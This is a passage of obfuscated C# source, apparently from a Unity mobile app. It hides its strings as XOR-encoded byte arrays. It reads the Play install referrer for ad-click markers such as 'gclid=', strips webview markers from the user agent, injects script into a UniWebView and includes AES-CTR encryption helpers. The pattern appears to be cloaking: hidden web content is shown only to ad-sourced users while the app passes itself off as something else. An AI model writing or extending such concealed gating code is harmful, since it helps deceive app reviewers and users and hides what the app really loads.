    private UniWebViewPopup _0xe933abed()
    {
        for (int _0x99cc7758 = _0x2b229fe6.Count - 1; _0x99cc7758 >= 0; _0x99cc7758--)
        {
            var _0x22d938af = _0x2b229fe6[_0x99cc7758];
            if (_0x22d938af != null && _0x22d938af.IsAlive)
                return _0x22d938af;
            _0x2b229fe6.RemoveAt(_0x99cc7758);
        }

        return null;
    }

    internal bool _0x15aae03a(string _0x5677adac)
    {
        return _0x5677adac.StartsWith(_0x4a5fc9c1._0x562286b4(new byte[9] { 173, 161, 178, 171, 165, 180, 250, 239, 239 }, 192), StringComparison.OrdinalIgnoreCase) || _0x5677adac.StartsWith(_0x4a5fc9c1._0x562286b4(new byte[24] { 106, 118, 118, 114, 113, 56, 45, 45, 114, 110, 99, 123, 44, 101, 109, 109, 101, 110, 103, 44, 97, 109, 111, 45 }, 2), StringComparison.OrdinalIgnoreCase) || _0x5677adac.StartsWith(_0x4a5fc9c1._0x562286b4(new byte[23] { 59, 39, 39, 35, 105, 124, 124, 35, 63, 50, 42, 125, 52, 60, 60, 52, 63, 54, 125, 48, 60, 62, 124 }, 83), StringComparison.OrdinalIgnoreCase);
    }

    static System.IO.Compression.CompressionLevel SmallestCompression()
    {
        return Enum.IsDefined(typeof(System.IO.Compression.CompressionLevel), 3) ? (System.IO.Compression.CompressionLevel)3 : System.IO.Compression.CompressionLevel.Optimal;
    }

    private bool _0x7ee130e8 = false;
    private string _0x68f27317(string _0x112602e2, string _0x15ab7d96)
    {
        if (string.IsNullOrEmpty(_0x15ab7d96))
            return _0x112602e2;
        if (_0x112602e2.Contains(_0x4a5fc9c1._0x562286b4(new byte[1] { 97 }, 94)))
            return _0x112602e2 + _0x4a5fc9c1._0x562286b4(new byte[8] { 121, 44, 58, 49, 59, 54, 59, 98 }, 95) + UnityWebRequest.EscapeURL(_0x15ab7d96);
        else
            return _0x112602e2 + _0x4a5fc9c1._0x562286b4(new byte[8] { 72, 4, 18, 25, 19, 30, 19, 74 }, 119) + UnityWebRequest.EscapeURL(_0x15ab7d96);
    }

    private string _0xdd031f1c()
    {
        string _0x28ac9369 = _0xd89d31d4();
        if (string.IsNullOrEmpty(_0x28ac9369))
            return _0x4a5fc9c1._0x562286b4(new byte[7] { 224, 249, 255, 242, 182, 166, 173 }, 150);
        string _0xe1d8430a = _0x28ac9369.Replace(_0x4a5fc9c1._0x562286b4(new byte[1] { 213 }, 137), _0x4a5fc9c1._0x562286b4(new byte[2] { 234, 234 }, 182)).Replace(_0x4a5fc9c1._0x562286b4(new byte[1] { 186 }, 157), _0x4a5fc9c1._0x562286b4(new byte[2] { 90, 33 }, 6));
        var _0xdc60580e = Regex.Match(_0x28ac9369, _0x4a5fc9c1._0x562286b4(new byte[12] { 26, 49, 43, 54, 52, 60, 118, 113, 5, 61, 114, 112 }, 89));
        string _0xfa713fb3 = _0xdc60580e.Success ? _0xdc60580e.Groups[1].Value : _0x4a5fc9c1._0x562286b4(new byte[3] { 233, 234, 232 }, 216);
        return _0x4a5fc9c1._0x562286b4(new byte[12] { 173, 227, 240, 235, 230, 241, 236, 234, 235, 173, 172, 254 }, 133) + _0x4a5fc9c1._0x562286b4(new byte[8] { 84, 67, 80, 2, 87, 67, 31, 5 }, 34) + _0xe1d8430a + _0x4a5fc9c1._0x562286b4(new byte[2] { 251, 231 }, 220) + _0x4a5fc9c1._0x562286b4(new byte[30] { 172, 187, 168, 250, 170, 168, 181, 174, 181, 231, 148, 187, 172, 179, 189, 187, 174, 181, 168, 244, 170, 168, 181, 174, 181, 174, 163, 170, 191, 225 }, 218) + _0x4a5fc9c1._0x562286b4(new byte[121] { 155, 136, 147, 158, 137, 148, 146, 147, 221, 153, 152, 155, 213, 146, 159, 151, 209, 150, 152, 132, 209, 139, 156, 145, 212, 134, 137, 143, 132, 134, 178, 159, 151, 152, 158, 137, 211, 153, 152, 155, 148, 147, 152, 173, 143, 146, 141, 152, 143, 137, 132, 213, 146, 159, 151, 209, 150, 152, 132, 209, 134, 154, 152, 137, 199, 155, 136, 147, 158, 137, 148, 146, 147, 213, 212, 134, 143, 152, 137, 136, 143, 147, 221, 139, 156, 145, 198, 128, 209, 158, 146, 147, 155, 148, 154, 136, 143, 156, 159, 145, 152, 199, 137, 143, 136, 152, 128, 212, 198, 128, 158, 156, 137, 158, 149, 213, 152, 212, 134, 128, 128 }, 253) + _0x4a5fc9c1._0x562286b4(new byte[26] { 63, 62, 61, 115, 43, 41, 52, 47, 52, 119, 124, 46, 40, 62, 41, 26, 60, 62, 53, 47, 124, 119, 46, 58, 114, 96 }, 91) + _0x4a5fc9c1._0x562286b4(new byte[52] { 4, 5, 6, 72, 16, 18, 15, 20, 15, 76, 71, 1, 16, 16, 54, 5, 18, 19, 9, 15, 14, 71, 76, 21, 1, 78, 18, 5, 16, 12, 1, 3, 5, 72, 79, 62, 45, 15, 26, 9, 12, 12, 1, 60, 79, 79, 76, 71, 71, 73, 73, 91 }, 96) + _0x4a5fc9c1._0x562286b4(new byte[37] { 12, 13, 14, 64, 24, 26, 7, 28, 7, 68, 79, 24, 4, 9, 28, 14, 7, 26, 5, 79, 68, 79, 36, 1, 6, 29, 16, 72, 9, 26, 5, 30, 80, 4, 79, 65, 83 }, 104) + _0x4a5fc9c1._0x562286b4(new byte[34] { 224, 225, 226, 172, 244, 246, 235, 240, 235, 168, 163, 242, 225, 234, 224, 235, 246, 163, 168, 163, 195, 235, 235, 227, 232, 225, 164, 205, 234, 231, 170, 163, 173, 191 }, 132) + _0x4a5fc9c1._0x562286b4(new byte[30] { 19, 18, 17, 95, 7, 5, 24, 3, 24, 91, 80, 26, 22, 15, 35, 24, 2, 20, 31, 39, 24, 30, 25, 3, 4, 80, 91, 66, 94, 76 }, 119) + _0x4a5fc9c1._0x562286b4(new byte[48] { 44, 42, 33, 35, 46, 57, 42, 120, 45, 57, 60, 101, 35, 58, 42, 57, 54, 60, 43, 98, 3, 35, 58, 42, 57, 54, 60, 98, 127, 27, 48, 42, 55, 53, 49, 45, 53, 127, 116, 46, 61, 42, 43, 49, 55, 54, 98, 127 }, 88) + _0xfa713fb3 + _0x4a5fc9c1._0x562286b4(new byte[35] { 0, 90, 11, 92, 69, 85, 70, 73, 67, 29, 0, 96, 72, 72, 64, 75, 66, 7, 100, 79, 85, 72, 74, 66, 0, 11, 81, 66, 85, 84, 78, 72, 73, 29, 0 }, 39) + _0xfa713fb3 + _0x4a5fc9c1._0x562286b4(new byte[238] { 78, 20, 69, 18, 11, 27, 8, 7, 13, 83, 78, 39, 6, 29, 84, 40, 86, 43, 27, 8, 7, 13, 78, 69, 31, 12, 27, 26, 0, 6, 7, 83, 78, 91, 93, 78, 20, 52, 69, 4, 6, 11, 0, 5, 12, 83, 29, 27, 28, 12, 69, 25, 5, 8, 29, 15, 6, 27, 4, 83, 78, 40, 7, 13, 27, 6, 0, 13, 78, 69, 14, 12, 29, 33, 0, 14, 1, 44, 7, 29, 27, 6, 25, 16, 63, 8, 5, 28, 12, 26, 83, 15, 28, 7, 10, 29, 0, 6, 7, 65, 64, 18, 27, 12, 29, 28, 27, 7, 73, 57, 27, 6, 4, 0, 26, 12, 71, 27, 12, 26, 6, 5, 31, 12, 65, 18, 8, 27, 10, 1, 0, 29, 12, 10, 29, 28, 27, 12, 83, 78, 8, 27, 4, 78, 69, 11, 0, 29, 7, 12, 26, 26, 83, 78, 95, 93, 78, 69, 4, 6, 11, 0, 5, 12, 83, 29, 27, 28, 12, 69, 4, 6, 13, 12, 5, 83, 78, 78, 69, 25, 5, 8, 29, 15, 6, 27, 4, 83, 78, 40, 7, 13, 27, 6, 0, 13, 78, 69, 25, 5, 8, 29, 15, 6, 27, 4, 63, 12, 27, 26, 0, 6, 7, 83, 78, 88, 93, 71, 89, 71, 89, 78, 69, 28, 8, 47, 28, 5, 5, 63, 12, 27, 26, 0, 6, 7, 83, 78 }, 105) + _0xfa713fb3 + _0x4a5fc9c1._0x562286b4(new byte[117] { 127, 97, 127, 97, 127, 97, 118, 44, 120, 106, 44, 44, 106, 30, 51, 59, 52, 50, 37, 127, 53, 52, 55, 56, 63, 52, 1, 35, 62, 33, 52, 35, 37, 40, 121, 33, 35, 62, 37, 62, 125, 118, 36, 34, 52, 35, 16, 54, 52, 63, 37, 21, 48, 37, 48, 118, 125, 42, 54, 52, 37, 107, 55, 36, 63, 50, 37, 56, 62, 63, 121, 120, 42, 35, 52, 37, 36, 35, 63, 113, 36, 48, 53, 106, 44, 125, 50, 62, 63, 55, 56, 54, 36, 35, 48, 51, 61, 52, 107, 37, 35, 36, 52, 44, 120, 106, 44, 50, 48, 37, 50, 57, 121, 52, 120, 42, 44 }, 81) + _0x4a5fc9c1._0x562286b4(new byte[5] { 56, 108, 109, 108, 126 }, 69);
    }

    private IEnumerator _0x3be6411f()
    {
        {
#if B_LOGS
            {
                Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[26] { 42, 37, 20, 2, 5, 44, 81, 56, 31, 24, 5, 24, 16, 29, 24, 11, 20, 35, 20, 23, 23, 20, 3, 20, 3, 81 }, 113));
            }
#endif
        }

        bool _0x572edd7e = false;
        InstallReferrer.GetReferrer((_0x24164904) =>
        {
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[24] { 240, 255, 206, 216, 223, 139, 249, 206, 205, 206, 217, 217, 206, 217, 246, 139, 204, 206, 223, 139, 73, 45, 57, 139 }, 171) + _0xdeaf10f8);
            if (_0x24164904.IsSuccess)
            {
                _0xdeaf10f8 = _0x24164904.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[28] { 114, 125, 76, 90, 93, 9, 123, 76, 79, 76, 91, 91, 76, 91, 116, 9, 122, 92, 74, 74, 76, 90, 90, 9, 203, 175, 187, 9 }, 41) + _0xdeaf10f8);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[27] { 108, 99, 82, 68, 67, 23, 101, 82, 81, 82, 69, 69, 82, 69, 106, 23, 113, 86, 94, 91, 82, 83, 23, 213, 177, 165, 23 }, 55) + _0x24164904);
#endif
                }

                _0xdeaf10f8 = "";
            }

            _0x7a171e5a = true;
        });
        StartCoroutine(_0x7ce9e266(2f));
        yield return new WaitUntil(() => _0x7a171e5a);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {_0xdeaf10f8}");
#endif
        }

        bool _0xa1e53d0a = _0xdeaf10f8.Contains(_0x4a5fc9c1._0x562286b4(new byte[6] { 18, 22, 25, 28, 17, 72 }, 117));
        _0x572edd7e = _0xa1e53d0a || _0xdeaf10f8.Contains(_0x4a5fc9c1._0x562286b4(new byte[18] { 20, 5, 5, 6, 91, 28, 27, 6, 1, 20, 18, 7, 20, 24, 91, 22, 26, 24 }, 117)) || _0xdeaf10f8.Contains(_0x4a5fc9c1._0x562286b4(new byte[17] { 212, 197, 197, 198, 155, 211, 212, 214, 208, 215, 218, 218, 222, 155, 214, 218, 216 }, 181));
        _0x7cc87b0c = _0xa1e53d0a ? "" : (_0x572edd7e ? "" : _0x7cc87b0c);
        _0x7cc87b0c = _0x7cc87b0c ?? "";
        _0x75db747a = _0x75db747a ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {_0x7cc87b0c}");
#endif
        }
    }

    internal void Update()
    {
        if (_0xb0cde9c4 == null)
            return;
        if (_0x3e19e2c1())
            _0x66808586();
        if (!isApplicationFocus || isApplicationPause)
            return;
        _0x3b5dc283();
        if (_0x297493b5 && _0x746293ac != null)
            _0x746293ac.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    private string _0x6cafdcc2 = "";
    private string _0xd89d31d4()
    {
        if (string.IsNullOrEmpty(_0xd6457b0c) && _0xb0cde9c4 != null)
            _0xd6457b0c = _0xb0cde9c4.GetUserAgent();
        if (string.IsNullOrEmpty(_0xd6457b0c))
            return string.Empty;
        string _0x88d8ea8e = Regex.Replace(_0xd6457b0c, _0x4a5fc9c1._0x562286b4(new byte[11] { 35, 12, 85, 68, 35, 12, 85, 8, 9, 35, 29 }, 127), string.Empty);
        _0x88d8ea8e = Regex.Replace(_0x88d8ea8e, _0x4a5fc9c1._0x562286b4(new byte[15] { 201, 230, 190, 215, 224, 252, 249, 241, 186, 206, 203, 174, 188, 200, 190 }, 149), string.Empty);
        _0x88d8ea8e = Regex.Replace(_0x88d8ea8e, _0x4a5fc9c1._0x562286b4(new byte[15] { 133, 182, 161, 160, 186, 188, 189, 252, 231, 143, 253, 227, 143, 160, 249 }, 211), string.Empty);
        return Regex.Replace(_0x88d8ea8e, _0x4a5fc9c1._0x562286b4(new byte[6] { 232, 199, 207, 134, 152, 201 }, 180), _0x4a5fc9c1._0x562286b4(new byte[1] { 134 }, 166)).Trim();
    }

    private string _0xe2c05b8b = "";
    private bool _0xa1a34f63 = false;
    internal Button _0x6e766892(string _0xe9921322, Transform _0x2371ee54)
    {
        var _0x4d2af3fd = new GameObject(_0xe9921322 + _0x4a5fc9c1._0x562286b4(new byte[3] { 0, 54, 44 }, 66), typeof(RectTransform), typeof(Image), typeof(Button));
        var _0xeae5e417 = _0x4d2af3fd.GetComponent<RectTransform>();
        _0xeae5e417.SetParent(_0x2371ee54, false);
        var _0x74031e74 = _0x4d2af3fd.GetComponent<Image>();
        _0x74031e74.color = new Color(0.92f, 0.92f, 0.95f, 1f);
        var _0xa8fe9053 = _0x4d2af3fd.GetComponent<Button>();
        var _0x2ec1f8e4 = _0xa8fe9053.colors;
        _0x2ec1f8e4.highlightedColor = new Color(0.85f, 0.85f, 0.9f);
        _0x2ec1f8e4.pressedColor = new Color(0.8f, 0.8f, 0.88f);
        _0xa8fe9053.colors = _0x2ec1f8e4;
        var _0x34d007f8 = new GameObject(_0x4a5fc9c1._0x562286b4(new byte[4] { 74, 123, 102, 106 }, 30), typeof(RectTransform), typeof(Text));
        var _0xc9426ce1 = _0x34d007f8.GetComponent<RectTransform>();
        _0xc9426ce1.SetParent(_0x4d2af3fd.transform, false);
        _0xc9426ce1.anchorMin = Vector2.zero;
        _0xc9426ce1.anchorMax = Vector2.one;
        _0xc9426ce1.offsetMin = _0xc9426ce1.offsetMax = Vector2.zero;
        var _0x1890dbd7 = _0x34d007f8.GetComponent<Text>();
        _0x1890dbd7.text = _0xe9921322;
        _0x1890dbd7.alignment = TextAnchor.MiddleCenter;
        _0x1890dbd7.color = Color.black;
        _0x1890dbd7.font = Resources.GetBuiltinResource<Font>(_0x4a5fc9c1._0x562286b4(new byte[9] { 210, 225, 250, 242, 255, 189, 231, 231, 245 }, 147));
        _0x1890dbd7.fontSize = 28;
        WLog(_0x4a5fc9c1._0x562286b4(new byte[14] { 141, 188, 171, 175, 186, 171, 140, 187, 186, 186, 161, 160, 238, 233 }, 206) + _0xe9921322 + _0x4a5fc9c1._0x562286b4(new byte[1] { 55 }, 16));
        return _0xa8fe9053;
    }

    static byte[] AesCtr(byte[] _0xd9067e60, byte[] _0x009387e2, byte[] _0x43da5014)
    {
        using var _0x9e267a21 = Aes.Create();
        _0x9e267a21.Mode = CipherMode.ECB;
        _0x9e267a21.Padding = PaddingMode.None;
        _0x9e267a21.Key = _0x009387e2;
        using var _0x3e9bc084 = _0x9e267a21.CreateEncryptor();
        var _0x63c55d3d = new byte[_0xd9067e60.Length];
        var _0x6eb23338 = new byte[16];
        var _0x16644a30 = new byte[16];
        Buffer.BlockCopy(_0x43da5014, 0, _0x6eb23338, 0, 4);
        int _0x72a48b0e = 0;
        while (_0x72a48b0e < _0xd9067e60.Length)
        {
            if (_0x3e9bc084.TransformBlock(_0x6eb23338, 0, 16, _0x16644a30, 0) != 16)
                throw new CryptographicException();
            int n = Math.Min(16, _0xd9067e60.Length - _0x72a48b0e);
            for (int _0x3d949979 = 0; _0x3d949979 < n; _0x3d949979++)
                _0x63c55d3d[_0x72a48b0e + _0x3d949979] = (byte)(_0xd9067e60[_0x72a48b0e + _0x3d949979] ^ _0x16644a30[_0x3d949979]);
            for (int _0x4b304da6 = _0x6eb23338.Length - 1; _0x4b304da6 >= 4; _0x4b304da6--)
            {
                _0x6eb23338[_0x4b304da6]++;
                if (_0x6eb23338[_0x4b304da6] != 0)
                    break;
            }

            _0x72a48b0e += n;
        }

        return _0x63c55d3d;
    }

    internal bool IsHttpUrl(string _0x169681ee)
    {
        if (string.IsNullOrEmpty(_0x169681ee))
            return false;
        return _0x169681ee.StartsWith(_0x4a5fc9c1._0x562286b4(new byte[7] { 94, 66, 66, 70, 12, 25, 25 }, 54), StringComparison.OrdinalIgnoreCase) || _0x169681ee.StartsWith(_0x4a5fc9c1._0x562286b4(new byte[8] { 23, 11, 11, 15, 12, 69, 80, 80 }, 127), StringComparison.OrdinalIgnoreCase);
    }

    internal bool IsGoogleAuthFlowUrl(string _0xf3e91928)
    {
        if (string.IsNullOrEmpty(_0xf3e91928))
            return false;
        return _0xf3e91928.IndexOf(_0x4a5fc9c1._0x562286b4(new byte[19] { 142, 140, 140, 128, 154, 129, 155, 156, 193, 136, 128, 128, 136, 131, 138, 193, 140, 128, 130 }, 239), StringComparison.OrdinalIgnoreCase) >= 0 || _0xf3e91928.IndexOf(_0x4a5fc9c1._0x562286b4(new byte[16] { 249, 251, 251, 247, 237, 246, 236, 235, 182, 255, 247, 247, 255, 244, 253, 182 }, 152), StringComparison.OrdinalIgnoreCase) >= 0 || _0xf3e91928.IndexOf(_0x4a5fc9c1._0x562286b4(new byte[21] { 72, 64, 64, 72, 67, 74, 90, 92, 74, 93, 76, 64, 65, 91, 74, 65, 91, 1, 76, 64, 66 }, 47), StringComparison.OrdinalIgnoreCase) >= 0 || _0xf3e91928.IndexOf(_0x4a5fc9c1._0x562286b4(new byte[11] { 148, 128, 135, 146, 135, 154, 144, 221, 144, 156, 158 }, 243), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private async void Start()
    {
        await _0x0f9e4672();
    }

    private float _0x9b598e6f = 0f;
    private Task _0x661990b2(IEnumerator _0x9240383d)
    {
        var _0xd3bf297d = new TaskCompletionSource<bool>();
        StartCoroutine(_0x302f8793(_0x9240383d, _0xd3bf297d));
        return _0xd3bf297d.Task;
    }

    private void _0x8ec30f06(UniWebView _0x7ce12ff6)
    {
        _0x7ce12ff6.BackgroundColor = Color.clear;
        _0x7ce12ff6.SetSupportMultipleWindows(true, true);
        _0x7ce12ff6.SetBackButtonEnabled(false);
        _0xb0cde9c4.SetUserAgent(_0xd89d31d4());
    }

    private string _0x98c60abb()
    {
        return ((char)('a' + _0x278db512.Next(0, 26))).ToString();
    }

    private void _0xb1419af5()
    {
        if (_0xb0cde9c4 == null)
            return;
        if (_0xcab4c561)
            _0xb0cde9c4.SetUserAgent(_0xd89d31d4());
        else
            _0xb0cde9c4.SetUserAgent("");
    }

    static byte[] PackSmallest(byte[] _0xa4fd172c, out byte _0xd343f3de)
    {
        var _0xc8510bc7 = CompressBrotli(_0xa4fd172c);
        var _0x4fede36e = CompressDeflate(_0xa4fd172c);
        if (_0xc8510bc7.Length < _0xa4fd172c.Length && _0xc8510bc7.Length <= _0x4fede36e.Length)
        {
            _0xd343f3de = 1;
            return _0xc8510bc7;
        }

        if (_0x4fede36e.Length < _0xa4fd172c.Length)
        {
            _0xd343f3de = 2;
            return _0x4fede36e;
        }

        _0xd343f3de = 0;
        return _0xa4fd172c;
    }

    private bool OpenUrlExternally(string _0x3ee66162)
    {
        return _0x82afa311(_0x3ee66162);
    }

    internal bool ContainsIgnoreCase(string _0xa4a08602, string _0xf1a64f0c)
    {
        if (string.IsNullOrEmpty(_0xa4a08602) || string.IsNullOrEmpty(_0xf1a64f0c))
            return false;
        return _0xa4a08602.IndexOf(_0xf1a64f0c, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private bool _0xae9ab6fe;
    static byte[] DecompressBrotli(byte[] _0x4e23aa10)
    {
        using var _0xbf0223d6 = new MemoryStream(_0x4e23aa10);
        using var _0x06ba6b85 = new BrotliStream(_0xbf0223d6, CompressionMode.Decompress);
        using var _0x8fd831ae = new MemoryStream();
        _0x06ba6b85.CopyTo(_0x8fd831ae);
        return _0x8fd831ae.ToArray();
    }

    private void MarkMainFrameCommitted(string _0x877b7bfd)
    {
        _0xae9ab6fe = true;
        string _0x05a3c141 = GetUrlHost(_0x877b7bfd);
        if (!string.IsNullOrEmpty(_0x05a3c141))
            _0x237a68c7 = _0x05a3c141;
    }

    private void StopCurrentFailedLoad(UniWebView _0x68c6cdd3)
    {
        _0x56e4205f(false);
        if (_0x68c6cdd3 == null)
            return;
        _0x68c6cdd3.Stop();
        if (_0x68c6cdd3.CanGoBack)
            _0x68c6cdd3.GoBack();
    }

    public void _0x612638ad()
    {
        isDestroyedForce = true;
        StopAllCoroutines();
        {
#if B_LOGS
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[18] { 152, 151, 166, 176, 183, 158, 227, 143, 162, 182, 173, 160, 171, 227, 132, 162, 174, 166 }, 195));
#endif
        }

        _0x38d7193f.Instance?._0x7c616eab();
        _0xf449ad2c.Instance._0x192e1309(_0xacc331e0._0x89a71d4c.DEFAULT);
    }

    private bool _0xe0e35fe8(string _0xf5048d7b, string _0xcd6a3bce)
    {
        string _0x480faa45 = _0x67978ba4(_0xf5048d7b);
        if (string.IsNullOrEmpty(_0x480faa45))
            _0x480faa45 = _0xcd6a3bce;
        if (_0xfd208c7d(_0x480faa45))
            return true;
        string _0xe75ef900 = string.IsNullOrEmpty(_0x480faa45) ? _0x4a5fc9c1._0x562286b4(new byte[29] { 85, 73, 73, 77, 78, 7, 18, 18, 77, 81, 92, 68, 19, 90, 82, 82, 90, 81, 88, 19, 94, 82, 80, 18, 78, 73, 82, 79, 88 }, 61) : _0x4a5fc9c1._0x562286b4(new byte[46] { 17, 13, 13, 9, 10, 67, 86, 86, 9, 21, 24, 0, 87, 30, 22, 22, 30, 21, 28, 87, 26, 22, 20, 86, 10, 13, 22, 11, 28, 86, 24, 9, 9, 10, 86, 29, 28, 13, 24, 16, 21, 10, 70, 16, 29, 68 }, 121) + _0x480faa45;
        WLog(_0x4a5fc9c1._0x562286b4(new byte[35] { 246, 221, 199, 218, 216, 208, 249, 220, 222, 208, 149, 216, 212, 199, 222, 208, 193, 149, 211, 212, 217, 217, 215, 212, 214, 222, 149, 212, 198, 149, 194, 208, 215, 143, 149 }, 181) + _0xe75ef900);
        return _0x82afa311(_0xe75ef900);
    }

    private void _0x05975927(string _0x57203874)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[34] { 103, 104, 89, 79, 72, 97, 28, 122, 89, 72, 95, 84, 28, 121, 68, 72, 78, 93, 28, 108, 73, 79, 84, 28, 120, 93, 72, 93, 28, 110, 93, 75, 6, 28 }, 60) + _0x57203874);
#endif
            }
        }

        var _0x11436f35 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x57203874);
        StartCoroutine(_0x1638bd6e(_0x11436f35));
    }

    // NATIVE WEB VIEW METHODS
    private UniWebView _0xb0cde9c4 = null;
    private string _0x73edeed1;
    private bool _0xaeccb2d2(int _0x076e8deb, string _0x8dd9feb0, string _0x68094413)
    {
        if (string.IsNullOrEmpty(_0x68094413))
            return false;
        if (!IsHttpUrl(_0x68094413))
            return true;
        if (string.IsNullOrEmpty(_0x8dd9feb0))
            return false;
        return _0x8dd9feb0.IndexOf(_0x4a5fc9c1._0x562286b4(new byte[20] { 204, 219, 219, 214, 202, 198, 199, 199, 204, 202, 221, 192, 198, 199, 214, 219, 204, 218, 204, 221 }, 137), StringComparison.OrdinalIgnoreCase) >= 0 || _0x8dd9feb0.IndexOf(_0x4a5fc9c1._0x562286b4(new byte[22] { 188, 171, 171, 166, 186, 182, 183, 183, 188, 186, 173, 176, 182, 183, 166, 171, 188, 191, 172, 170, 188, 189 }, 249), StringComparison.OrdinalIgnoreCase) >= 0 || _0x8dd9feb0.IndexOf(_0x4a5fc9c1._0x562286b4(new byte[21] { 125, 106, 106, 103, 123, 119, 118, 118, 125, 123, 108, 113, 119, 118, 103, 123, 116, 119, 107, 125, 124 }, 56), StringComparison.OrdinalIgnoreCase) >= 0 || _0x8dd9feb0.IndexOf(_0x4a5fc9c1._0x562286b4(new byte[22] { 177, 166, 166, 171, 161, 186, 191, 186, 187, 163, 186, 171, 161, 166, 184, 171, 167, 183, 188, 177, 185, 177 }, 244), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    static System.Numerics.BigInteger FromBigEndian(byte[] _0x403b0df8)
    {
        var _0xbb392d73 = new byte[_0x403b0df8.Length + 1];
        for (int _0x7a72f272 = 0; _0x7a72f272 < _0x403b0df8.Length; _0x7a72f272++)
            _0xbb392d73[_0x403b0df8.Length - 1 - _0x7a72f272] = _0x403b0df8[_0x7a72f272];
        return new System.Numerics.BigInteger(_0xbb392d73);
    }

    private int _0x2d56d5cb = -1;
    private async Task<string> _0xfce3a470(int _0xfc11fe5f = 5, int _0xf3254a61 = 500)
    {
        try
        {
            CommState _0x02ada724 = default;
            int _0x7a9f7a63 = 0;
            do
            {
                _0x02ada724 = await _0xd7b8a4df();
                if (_0x02ada724.Ready)
                    break;
                await Task.Delay(_0xf3254a61);
            }
            while (_0x7a9f7a63++ < _0xfc11fe5f);
            var _0xfceea3a3 = _0x02ada724.Ready && !_0x02ada724.IsPrivacy ? _0x02ada724.SavedLink : string.Empty;
            {
#if B_LOGS
                {
                    Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[24] { 125, 114, 67, 85, 82, 123, 6, 106, 73, 71, 66, 6, 85, 71, 80, 67, 66, 6, 74, 79, 72, 77, 28, 6 }, 38) + _0xfceea3a3);
                }
#endif
            }

            return _0xfceea3a3 ?? string.Empty;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[39] { 10, 5, 52, 34, 37, 12, 113, 22, 52, 37, 113, 62, 35, 113, 33, 48, 35, 34, 52, 113, 34, 48, 39, 52, 53, 113, 61, 56, 63, 58, 113, 55, 48, 56, 61, 52, 53, 107, 113 }, 81) + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    private AndroidJavaObject _0x05e031e8 { get; set; }

    private string GetUrlHost(string _0x009d1ccf)
    {
        if (string.IsNullOrEmpty(_0x009d1ccf))
            return null;
        Uri _0x86921c6a;
        if (!Uri.TryCreate(_0x009d1ccf, UriKind.Absolute, out _0x86921c6a))
            return null;
        string _0x19ddbe1e = _0x86921c6a.Host;
        if (_0x19ddbe1e.StartsWith(_0x4a5fc9c1._0x562286b4(new byte[4] { 110, 110, 110, 55 }, 25), StringComparison.OrdinalIgnoreCase))
            _0x19ddbe1e = _0x19ddbe1e.Substring(4);
        return _0x19ddbe1e;
    }

    static _0x6fdccca8 ReadScoreMetadata(string _0x20276d12)
    {
        if (string.IsNullOrWhiteSpace(_0x20276d12))
            return new _0x6fdccca8();
        try
        {
            return JsonConvert.DeserializeObject<_0x6fdccca8>(_0x20276d12) ?? new _0x6fdccca8();
        }
        catch (Exception)
        {
            return new _0x6fdccca8();
        }
    }

    private string _0x05aab7a4 = "";
    static int[] BuildTextAlphabetIndex()
    {
        var _0xa67ed904 = new int[128];
        for (int _0x67890145 = 0; _0x67890145 < _0xa67ed904.Length; _0x67890145++)
            _0xa67ed904[_0x67890145] = -1;
        for (int _0x7ca0a808 = 0; _0x7ca0a808 < TextAlphabet.Length; _0x7ca0a808++)
            _0xa67ed904[TextAlphabet[_0x7ca0a808]] = _0x7ca0a808;
        return _0xa67ed904;
    }

    private JObject _0x0fb3a009(params string[] _0x7fadf523)
    {
        JObject _0x1f60cdcb = new JObject();
        foreach (var _0x1d6a5c48 in _0x7fadf523)
        {
            string _0x101afa00;
            do
            {
                _0x101afa00 = _0x98c60abb();
            }
            while (_0x1f60cdcb.ContainsKey(_0x101afa00));
            {
#if B_LOGS
                Debug.Log($"[Test] Crypto key={_0x101afa00} val={_0x1d6a5c48}");
#endif
            }

            _0x1f60cdcb.Add(_0x101afa00, _0x1d6a5c48 == null ? "" : _0x1d6a5c48);
        }

        return _0x1f60cdcb;
    }

    internal string _0x67978ba4(string _0xf001002e)
    {
        int _0xa82bc6c3 = _0xf001002e.IndexOf(_0x4a5fc9c1._0x562286b4(new byte[3] { 101, 104, 49 }, 12), StringComparison.OrdinalIgnoreCase);
        if (_0xa82bc6c3 < 0)
            return null;
        string _0xba5c931b = _0xf001002e.Substring(_0xa82bc6c3 + 3);
        int _0x08a7f3ef = _0xba5c931b.IndexOf('&');
        return _0x08a7f3ef >= 0 ? _0xba5c931b.Substring(0, _0x08a7f3ef) : _0xba5c931b;
    }

    private ApplicationInstallMode _0xe91e8671 = ApplicationInstallMode.Unknown;
    private void _0x80d1ea05()
    {
        using (var _0xb34e027a = new AndroidJavaClass(_0x4a5fc9c1._0x562286b4(new byte[30] { 22, 26, 24, 91, 0, 27, 28, 1, 12, 70, 17, 91, 5, 25, 20, 12, 16, 7, 91, 32, 27, 28, 1, 12, 37, 25, 20, 12, 16, 7 }, 117)))
        using (var _0x7168b000 = _0xb34e027a.GetStatic<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[15] { 173, 187, 188, 188, 171, 160, 186, 143, 173, 186, 167, 184, 167, 186, 183 }, 206)))
        using (var _0xce56e7e4 = _0x7168b000.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[9] { 132, 134, 151, 170, 141, 151, 134, 141, 151 }, 227)))
        {
            if (_0xce56e7e4 == null)
                return;
